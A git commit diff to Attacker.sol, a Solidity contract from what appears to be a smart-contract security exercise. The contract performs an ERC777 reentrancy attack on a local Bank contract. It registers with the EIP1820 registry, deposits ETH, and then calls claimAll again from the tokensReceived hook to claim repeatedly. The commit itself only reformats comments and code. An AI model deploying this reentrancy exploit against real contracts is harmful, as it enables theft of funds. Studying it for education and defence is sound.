618965e9003d03343bd53d29464d965d6d12d8c9
Lucasxfff <lucasfu1994@gmail.com>
2024-11-14 22:23:42 +0800

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -9,26 +9,26 @@ import "./Bank.sol";
 
 contract Attacker is AccessControl, IERC777Recipient {
     bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
-    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); //This is the location of the EIP1820 registry
-    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient"); //When someone tries to send an ERC777 contract, they check if the recipient implements this interface
+    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); // This is the location of the EIP1820 registry
+    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient"); // When someone tries to send an ERC777 contract, they check if the recipient implements this interface
     uint8 depth = 0;
     uint8 max_depth = 2;
 
-    Bank public bank; 
+    Bank public bank;
 
-    event Deposit(uint256 amount );
+    event Deposit(uint256 amount);
     event Recurse(uint8 depth);
 
     constructor(address admin) {
         _grantRole(DEFAULT_ADMIN_ROLE, admin);
         _grantRole(ATTACKER_ROLE, admin);
-        _erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this)); //In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
+        _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this)); // In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
     }
 
     function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
         bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
-        _grantRole(ATTACKER_ROLE, bank.token().address);
+        _grantRole(ATTACKER_ROLE, address(bank.token()));
     }
 
     /*
@@ -38,10 +38,10 @@ contract Attacker is AccessControl, IERC777Recipient {
     function attack(uint256 amt) payable public {
         require(address(bank) != address(0), "Target bank not set");
 
-        // Initiate deposit with specified amount of ETH
+        // Start the attack by depositing ETH into the bank contract
         bank.deposit{value: amt}();
-        
-        // Start reentrancy attack by calling the vulnerable function
+
+        // Trigger the reentrant call by claiming all tokens
         bank.claimAll();
     }
 
@@ -65,11 +65,11 @@ contract Attacker is AccessControl, IERC777Recipient {
         bytes calldata userData,
         bytes calldata operatorData
     ) external {
-        // Recursion control to prevent infinite loop
+        // Recursively call claimAll to exploit the vulnerability up to max_depth
         if (depth < max_depth) {
             depth++;
             emit Recurse(depth);
-            bank.claimAll(); // Re-entrantly calls the claimAll to drain funds
+            bank.claimAll();
             depth--;
         }
     }
